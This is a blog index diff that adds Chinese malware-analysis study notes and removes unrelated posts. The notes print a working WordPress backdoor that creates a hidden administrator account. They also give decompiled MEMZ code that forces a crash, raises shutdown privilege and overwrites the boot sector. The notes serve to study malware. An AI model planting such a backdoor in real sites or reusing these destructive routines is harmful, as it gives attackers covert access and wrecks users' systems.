@@ -235,6 +235,171 @@
 
 
   
+    <article id="post-daily/virus/2" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/04/20/daily/virus/2/" class="article-date">
+  	<time datetime="2021-04-20T10:42:48.000Z" itemprop="datePublished">2021-04-20</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/04/20/daily/virus/2/">
+        每日看病毒分析和leetcode-2
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="老毛桃携带木马病毒"><a href="#老毛桃携带木马病毒" class="headerlink" title="老毛桃携带木马病毒"></a>老毛桃携带木马病毒</h2><p>火绒大大的文章 <a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1258730-1-1.html">https://www.52pojie.cn/thread-1258730-1-1.html</a></p>
+<p>之前用过老毛桃和大白菜，发现都会预装软件。当时啥也不懂，就没详细看，今天可以详细看了。</p>
+<p>截至本文写作，老毛桃官网还可以下载<a target="_blank" rel="noopener" href="https://www.laomaotao.net/">https://www.laomaotao.net/</a> ，不过完整版800多M是个啥</p>
+<h2 id="php源码解密"><a href="#php源码解密" class="headerlink" title="php源码解密"></a>php源码解密</h2><p><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-693641-1-1.html">https://www.52pojie.cn/thread-693641-1-1.html</a></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-daily/virus/1" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/04/19/daily/virus/1/" class="article-date">
+  	<time datetime="2021-04-19T10:42:48.000Z" itemprop="datePublished">2021-04-19</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/04/19/daily/virus/1/">
+        每日看病毒分析和leetcode-1
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="justnews-5-2-3破解版后门"><a href="#justnews-5-2-3破解版后门" class="headerlink" title="justnews 5.2.3破解版后门"></a>justnews 5.2.3破解版后门</h2><p>52pojie链接 <a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1084019-1-1.html">https://www.52pojie.cn/thread-1084019-1-1.html</a></p>
+<p>没有搜到样本，后门流程如下：</p>
+<ol>
+<li>functions.php 添加了一个后门的动作，增加了一个访问密钥为go,backdoor/123456的账户</li>
+<li>后面一个panel.php多层base64编码了网站、作者等信息。</li>
+</ol>
+<p>这个作者的另一篇文章 <a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1074873-1-1.html">https://www.52pojie.cn/thread-1074873-1-1.html</a></p>
+<p>有样本，查看</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">add_action(<span class="string">&#x27;wp_head&#x27;</span>, <span class="string">&#x27;wp_backdoor&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_backdoor</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (md5($_GET[<span class="string">&#x27;backdoor&#x27;</span>]) == <span class="string">&#x27;34d1f91fb2e514b8576fab1a75a89a6b&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">require</span>(<span class="string">&#x27;wp-includes/registration.php&#x27;</span>);</span><br><span class="line">		<span class="keyword">if</span> (!username_exists(<span class="string">&#x27;backdoor&#x27;</span>)) &#123;</span><br><span class="line">			$user_id = wp_create_user(<span class="string">&#x27;backdoor&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line">			$user = <span class="keyword">new</span> WP_User($user_id);</span><br><span class="line">			$user-&gt;set_role(<span class="string">&#x27;administrator&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>和这个一样的逻辑啊。。</p>
+<p>混淆加密帖子 <a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1074918-1-1.html">https://www.52pojie.cn/thread-1074918-1-1.html</a></p>
+<p>PHP Debug+vscode+xDebug+php7.2+PHP 智能补全，单步调试到eval就可以看到主逻辑</p>
+<p>php解密资料(zym加密)<a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-693641-1-1.html">https://www.52pojie.cn/thread-693641-1-1.html</a></p>
+<h2 id="伪装成docx的病毒分析"><a href="#伪装成docx的病毒分析" class="headerlink" title="伪装成docx的病毒分析"></a>伪装成docx的病毒分析</h2><p><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1412858-1-1.html">https://www.52pojie.cn/thread-1412858-1-1.html</a></p>
+<p>没有给样本</p>
+<p>可以使用Detous Hook反调试函数(新知识)</p>
+<h2 id="彩虹猫-MEMZ-病毒分析"><a href="#彩虹猫-MEMZ-病毒分析" class="headerlink" title="彩虹猫(MEMZ)病毒分析"></a>彩虹猫(MEMZ)病毒分析</h2><p><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1096117-1-1.html">https://www.52pojie.cn/thread-1096117-1-1.html</a></p>
+<p>解压后有个bat文件，然后使用批处理+ActiveX命令</p>
+<p>流程：</p>
+<ol>
+<li>使用base64串建立x文件</li>
+<li>建立x.js，用于base64解码x到z.zip</li>
+<li>解码x之后再解压memz文件到%appdata%\MEMZ.exe</li>
+<li>删除x，x.js，z.zip</li>
+<li>执行MEMZ.exe</li>
+</ol>
+<p>过程中所有的输出均被重定向到NUL</p>
+<p>前面输入了一大堆base64，输出后是个magic number为PK的文件，结合bat文件命令，这应该是一个zip压缩包</p>
+<p>解压之后就是那个memz.exe了(只有15kb的病毒，很有前途啊)</p>
+<p>exeinfope扫描，32位，无壳</p>
+<p>getSystemMetics <a target="_blank" rel="noopener" href="https://baike.baidu.com/item/GetSystemMetrics/5608817">https://baike.baidu.com/item/GetSystemMetrics/5608817</a> 获取屏幕分辨率，分别是x,y</p>
+<p>病毒第一次运行，会创建10个自己，参数是/watchdog，然后以main参数运行，并退出程序</p>
+<p>/watchdog参数下会最终拒绝关机，不断地衍生出更多进程，每次会等待10秒。如果进程减少了，获取关机权限</p>
+<p>获取关机权限函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">BOOL __usercall sub_401021@&lt;eax&gt;(<span class="keyword">int</span> a1@&lt;ebp&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  HMODULE v3; <span class="comment">// edi</span></span><br><span class="line">  FARPROC RtlAdjustPrivilege; <span class="comment">// ebx</span></span><br><span class="line">  FARPROC NtRaiseHardError; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">void</span> (__cdecl *v6)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); <span class="comment">// esi</span></span><br><span class="line">  HANDLE v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp-20h] [ebp-28h]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">TOKEN_PRIVILEGES</span> <span class="title">v10</span>;</span> <span class="comment">// [esp-18h] [ebp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [esp-8h] [ebp-10h] BYREF</span></span><br><span class="line">  HANDLE v12; <span class="comment">// [esp-4h] [ebp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [esp+0h] [ebp-8h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [esp+4h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">20</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    CreateThread(<span class="number">0</span>, <span class="number">0x1000</span>u, StartAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    Sleep(<span class="number">0x64</span>u);</span><br><span class="line">    --v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v1 );</span><br><span class="line">  v2 = v14;</span><br><span class="line">  v14 = a1;</span><br><span class="line">  v9 = v2;</span><br><span class="line">  v3 = LoadLibraryA(<span class="string">&quot;ntdll&quot;</span>);</span><br><span class="line">  RtlAdjustPrivilege = GetProcAddress(v3, <span class="string">&quot;RtlAdjustPrivilege&quot;</span>);</span><br><span class="line">  NtRaiseHardError = GetProcAddress(v3, <span class="string">&quot;NtRaiseHardError&quot;</span>);</span><br><span class="line">  v6 = (<span class="keyword">void</span> (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))NtRaiseHardError;</span><br><span class="line">  <span class="keyword">if</span> ( RtlAdjustPrivilege &amp;&amp; NtRaiseHardError )</span><br><span class="line">  &#123;</span><br><span class="line">    ((<span class="keyword">void</span> (__cdecl *)(<span class="keyword">int</span>, <span class="keyword">int</span>, _DWORD, <span class="keyword">char</span> *, <span class="keyword">int</span>, <span class="keyword">int</span>))RtlAdjustPrivilege)(<span class="number">19</span>, <span class="number">1</span>, <span class="number">0</span>, (<span class="keyword">char</span> *)&amp;v13 + <span class="number">3</span>, v13, v9);</span><br><span class="line">    v6(<span class="number">-1073741790</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, &amp;v11);</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = GetCurrentProcess();</span><br><span class="line">  OpenProcessToken(v7, <span class="number">0x28</span>u, &amp;v12);</span><br><span class="line">  LookupPrivilegeValueW(<span class="number">0</span>, <span class="string">L&quot;SeShutdownPrivilege&quot;</span>, (PLUID)v10.Privileges);</span><br><span class="line">  v10.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">  v10.Privileges[<span class="number">0</span>].Attributes = <span class="number">2</span>;</span><br><span class="line">  AdjustTokenPrivileges(v12, <span class="number">0</span>, &amp;v10, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> ExitWindowsEx(<span class="number">6u</span>, <span class="number">0x10007</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>监测数量部分</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = CreateToolhelp32Snapshot(<span class="number">2u</span>, <span class="number">0</span>);</span><br><span class="line">    pe.dwSize = <span class="number">556</span>;</span><br><span class="line">    Process32FirstW(v2, &amp;pe);</span><br><span class="line">    v3 = lpString1;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      hObject = OpenProcess(<span class="number">0x400</span>u, <span class="number">0</span>, pe.th32ProcessID);</span><br><span class="line">      lpString2 = (LPCSTR)LocalAlloc(<span class="number">0x40</span>u, <span class="number">0x200</span>u);</span><br><span class="line">      GetProcessImageFileNameA(hObject, lpString2, <span class="number">512</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !lstrcmpA(v3, lpString2) )</span><br><span class="line">        ++v4;</span><br><span class="line">      CloseHandle(hObject);</span><br><span class="line">      LocalFree((HLOCAL)lpString2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( Process32NextW(v2, &amp;pe) );</span><br><span class="line">    CloseHandle(v2);</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt; v7 )</span><br><span class="line">      sub_401021();</span><br><span class="line">    v7 = v4;</span><br><span class="line">    Sleep(<span class="number">0xA</span>u);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>向PhysicalDrive0写入几个奇怪的字节，0x7A0大小。看大佬分析是改变了扇区启动项。</p>
+<p>然后创建线程，函数列表位于405130，共10个函数</p>
+<ol>
+<li>打开随机网址<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_4014FC</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line"><span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">v1 = sub_401A55();</span><br><span class="line">ShellExecuteA(<span class="number">0</span>, <span class="string">&quot;open&quot;</span>, (&amp;lpFile)[v1 % <span class="number">0x2E</span>], <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">v2 = sub_401A55();</span><br><span class="line"><span class="keyword">return</span> sub_401B09(</span><br><span class="line">        COERCE_UNSIGNED_INT64((<span class="keyword">double</span>)a1),</span><br><span class="line">        HIDWORD(COERCE_UNSIGNED_INT64((<span class="keyword">double</span>)a1)),</span><br><span class="line">        (<span class="keyword">double</span>)(v2 % <span class="number">200</span>) + <span class="number">1500.0</span> / ((<span class="keyword">double</span>)a1 / <span class="number">15.0</span> + <span class="number">1.0</span>) + <span class="number">100.0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li>随机设置鼠标位置<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_40156D</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> v2; <span class="comment">// esi</span></span><br><span class="line"><span class="keyword">int</span> v3; <span class="comment">// edi</span></span><br><span class="line"><span class="keyword">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line"><span class="keyword">int</span> v5; <span class="comment">// esi</span></span><br><span class="line"><span class="keyword">int</span> v6; <span class="comment">// ecx</span></span><br><span class="line"><span class="keyword">int</span> v7; <span class="comment">// eax</span></span><br><span class="line"><span class="keyword">int</span> v8; <span class="comment">// ecx</span></span><br><span class="line"><span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line"><span class="keyword">int</span> v11; <span class="comment">// [esp-4h] [ebp-18h]</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tagPOINT</span> <span class="title">Point</span>;</span> <span class="comment">// [esp+Ch] [ebp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">GetCursorPos(&amp;Point);</span><br><span class="line">v2 = a2 / <span class="number">2200</span> + <span class="number">2</span>;</span><br><span class="line">v3 = sub_401A55(<span class="number">2200</span>) % v2;</span><br><span class="line">v5 = sub_401A55(v4) % v2;</span><br><span class="line">v7 = sub_401A55(v6);</span><br><span class="line">v11 = Point.y + v3 * (v7 % <span class="number">3</span> - <span class="number">1</span>);</span><br><span class="line">v9 = sub_401A55(v8);</span><br><span class="line">SetCursorPos(Point.x + v5 * (v9 % <span class="number">3</span> - <span class="number">1</span>), v11);</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li>通过sendInput发送随机ASCII码消息</li>
+<li>播放SystemHand声音</li>
+<li>随便画一些东西</li>
+<li>弹出Still using this computer? lol</li>
+<li>随机画图标</li>
+<li>穷举桌面上的窗口，并发送超时消息。这样会导致系统崩溃</li>
+<li>复制一个矩形</li>
+<li>还是随机画矩形</li>
+</ol>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-daily/IS/open-course-1" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -796,159 +961,9 @@
 
 
   
-    <article id="post-note/papers/ai/lda" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/03/24/note/papers/ai/lda/" class="article-date">
-  	<time datetime="2021-03-24T02:00:06.000Z" itemprop="datePublished">2021-03-24</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/03/24/note/papers/ai/lda/">
-        LDA隐含狄利克雷分布学习
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="前置概念"><a href="#前置概念" class="headerlink" title="前置概念"></a>前置概念</h2><h3 id="特征值和特征向量"><a href="#特征值和特征向量" class="headerlink" title="特征值和特征向量"></a>特征值和特征向量</h3><p>给定一个方阵$\mathbf A$，它的特征向量$\mathbf v$经过$\lambda$线性变换后，新向量与之前的仍在同一直线上，方向或长度可能变化，即</p>
-<p>$\mathbf{Av}=\lambda\mathbf{v}$</p>
-<h3 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h3><p>特征指的是从原始数据提取的单个属性，一般是一个数。原始数据必须转化成一个特征向量才可以进一步分析。它们类似于统计中的自变量。特征向量所属的向量空间称为特征空间。</p>
-<h3 id="主题模型"><a href="#主题模型" class="headerlink" title="主题模型"></a>主题模型</h3><p>是一种统计模型，如果一篇文章有一个中心思想，那么一些特定的词语会更频繁地出现。但是一篇文章通常包含多个主题，所以应该分析包含哪些主题，每个主题所占比例是多少。</p>
-<h3 id="潜在语义索引LSI"><a href="#潜在语义索引LSI" class="headerlink" title="潜在语义索引LSI"></a>潜在语义索引LSI</h3><p>不同文章之间使用词语关联起来，得到词语的潜在语义索引。将文本集合表示成一个M*N的矩阵，M是词语总数，N是文档数。(i,j)代表在第j篇文档中i出现的个数。通过对文档向量进行奇异值分解，取前k个最大奇异值及对应的奇异矢量构成一个新矩阵来近似表示原文档向量。新矩阵反映了文档中任意两个词语之间的关联性，消除了词和文档之间语义的模糊度。</p>
-<h3 id="多项式分布"><a href="#多项式分布" class="headerlink" title="多项式分布"></a>多项式分布</h3><p>贝叶斯定理</p>
-<p>$p(A|B)=\frac{p(A)p(B|A)}{p(B)}$</p>
-<p>其中$p(A)$是A的先验概率，$P(B)$是边缘概率</p>
-<p>贝叶斯估计是将贝叶斯定理推广到连续的概率分布中</p>
-<p>先验分布*似然函数=后验分布</p>
-<p>表示一个具有多个结果的事件执行k次的概率分布，是二项分布在高维度上的推广，记为$Mult(x)$</p>
-<p>$p(x|\beta)=\frac{n!}{\Pi_{i=1}^Kx_i!}\Pi_{i=1}^Kp_i^{x_i}$</p>
-<p>狄利克雷分布表示了一组多变量并且连续的概率分布，记为$Dir(\alpha)$</p>
-<p>$p(\theta|\alpha)=\frac{\Gamma(\sum_{i=1}^K\alpha_i)}{\Pi_{i=1}^K\Gamma(\alpha_i)}\Pi_{i=1}^K\theta_i^{\alpha_i-1}$</p>
-<p>$Dir(\alpha)*Mult(x)=Dir(x+\alpha)$</p>
-<p>狄利克雷分布的期望$E(\theta)=\left(\frac{\alpha_1}{\sum_{i=1}^K\alpha_i},\frac{\alpha_2}{\sum_{i=1}^K\alpha_I},…,\frac{\alpha_K}{\sum_{i=1}^K\alpha_i}\right)$</p>
-<h2 id="潜在狄利克雷分配"><a href="#潜在狄利克雷分配" class="headerlink" title="潜在狄利克雷分配"></a>潜在狄利克雷分配</h2><p>三层贝叶斯模型。</p>
-<p>文档中每一个词都是通过主题产生的，一篇文章可能有多个不同的主题。文档集上应分布着关于主题的某个概率分布，每篇文档的主题都满足这个概率分布。而词与词的不同组合，将产生不同的主题，因此每个主题又是关于词的条件概率分布。主题分布是不可见的，但是词语分布是可见的。根据文本向量化的思想，可以通过狄利克雷分布来刻画主题、词语和文档之间的关系，通过对文档中词语的分布情况，来推断文档的主题。</p>
-<p>对于一篇文档m，主题分布z是用过多项分布$\theta$来表示并生成的，记做$z<del>Mult(\theta)$。分布$\theta$壳解释为通过按文档维度来计算的主题分布情况。这一分部无法直接观测得到，而$\theta$的共轭先验概率分布是超参数为$\alpha$的狄利克雷分布，记为$\theta</del>Dir(\alpha)$，因此需要通过$\alpha$来推断$\theta$</p>
-<p>设文档数量为M，主题数为K，共V个词语，$\theta_m$表示第m个文档$d_m$中的主题分布，是K维向量$z_m={z_{m,1},…,z_{m,K}}$</p>
-<p>文档$d_m$通过$\theta_m$生成第k个主题记为$z_{m,k}$，$z_{m,k}$下面有$n_{m,k}$个词语，这些词语是通过多项分布$\phi<del>Mult$表示并生成的，$w</del>Mult(\phi)$。解释为按主题维度来统计词语的分布情况。$\phi$无法直接观测得到，是超参数为$\beta$的狄利克雷分布，记做$\phi~Dir(\beta)$，因此$\phi$通过超参数$\beta$来辅助推断。主题$z_{m,k}$下的词语分布是V维向量，$d_m$可以表示为${w_{m,1},…,w_{m,N}}$,N为词语数。</p>
-<p>文档的生成过程就是反复执行选择主题-选择词语的操作，最终生成整个文档的集合。</p>
-<p>隐含参数文档主题分布$\theta$和主题词语分布$\phi$是最终概率分布的关键，参数推断有两种方式，变分贝叶斯参数推断方法(使用最大化期望算法EM)和Gibbs采样法。</p>
-<p>是词袋模型，不考虑词语顺序。</p>
-<h2 id="狄利克雷多项回归DMR"><a href="#狄利克雷多项回归DMR" class="headerlink" title="狄利克雷多项回归DMR"></a>狄利克雷多项回归DMR</h2><p>从文本数据本身出发，通过控制先验参数的输入，同时简化模型在采样阶段的复杂性，获得更好的效果和更快的速度。</p>
-<p>在对样本利用狄利克雷参数进行建模时，会将狄利克雷先验参数一同作为模型参数进行推断，使得参数通过学习得到。在DMR建模时，相比LDA模型增加了两个参数，分别为文档特征向量$x_d$和主题特征向量$\lambda_t$。假设$x_d$包含了文档中的所有特征，$\lambda_t$包含了各个主题下所有特征的权重值。</p>
-<p>首先通过方差为$\sigma^2I$，均值为$0$的正态分布选择一个$\lambda_t$，并从参数为$\beta$的地理克雷分布中选择一个主题t的分布$\phi_t$。设每个主题t的狄利克雷先验参数的计算公式为$\alpha_{dt}=exp(x^T_d\lambda_t$，文档-主题分布$\theta$和主题-词语分布$\phi$两个参数的生产方式与LDA一致。</p>
-<h2 id="多元狄利克雷多项回归主题模型MDMR"><a href="#多元狄利克雷多项回归主题模型MDMR" class="headerlink" title="多元狄利克雷多项回归主题模型MDMR"></a>多元狄利克雷多项回归主题模型MDMR</h2><p>新闻文档生成过程和传统LDA一致</p>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>主题模型 <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E4%B8%BB%E9%A2%98%E6%A8%A1%E5%9E%8B">https://zh.wikipedia.org/wiki/%E4%B8%BB%E9%A2%98%E6%A8%A1%E5%9E%8B</a></p>
-<p>特征向量 <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%89%B9%E5%BE%81%E5%80%BC%E5%92%8C%E7%89%B9%E5%BE%81%E5%90%91%E9%87%8F">https://zh.wikipedia.org/wiki/%E7%89%B9%E5%BE%81%E5%80%BC%E5%92%8C%E7%89%B9%E5%BE%81%E5%90%91%E9%87%8F</a></p>
-<p>潜在语义索引 <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%BD%9C%E5%9C%A8%E8%AF%AD%E4%B9%89%E7%B4%A2%E5%BC%95">https://zh.wikipedia.org/wiki/%E6%BD%9C%E5%9C%A8%E8%AF%AD%E4%B9%89%E7%B4%A2%E5%BC%95</a></p>
-<p>奇异值分解 <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%A5%87%E5%BC%82%E5%80%BC%E5%88%86%E8%A7%A3">https://zh.wikipedia.org/wiki/%E5%A5%87%E5%BC%82%E5%80%BC%E5%88%86%E8%A7%A3</a></p>
-<p>隐含狄利克雷分布 <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E9%9A%90%E5%90%AB%E7%8B%84%E5%88%A9%E5%85%8B%E9%9B%B7%E5%88%86%E5%B8%83">https://zh.wikipedia.org/wiki/%E9%9A%90%E5%90%AB%E7%8B%84%E5%88%A9%E5%85%8B%E9%9B%B7%E5%88%86%E5%B8%83</a></p>
-<p>杜增文. 基于狄利克雷回归的微博主题检测模型研究[D].中国科学院大学(中国科学院大学人工智能学院),2020.</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-note/body/train-1" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/03/17/note/body/train-1/" class="article-date">
-  	<time datetime="2021-03-17T12:14:39.000Z" itemprop="datePublished">2021-03-17</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/03/17/note/body/train-1/">
-        瘦子训练
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>一周7天训练反而会增肌变慢</p>
-<p>连续训练两到三天，要彻底休息一天</p>
-<p>同一块肌肉不安排连续两天训练</p>
-<p>周一周四连躯干，周二周五练四肢，其他时间休息</p>
-<p>每2-3月安排恢复周，重量减半或组次减半或完全不练</p>
-<p>熬夜是增肌的死对头，皮质醇</p>
-<p>可以提早训练时间，少玩手机</p>
-<p>每次训练时间延长，频次降低</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
     </nav>
   
 </div>
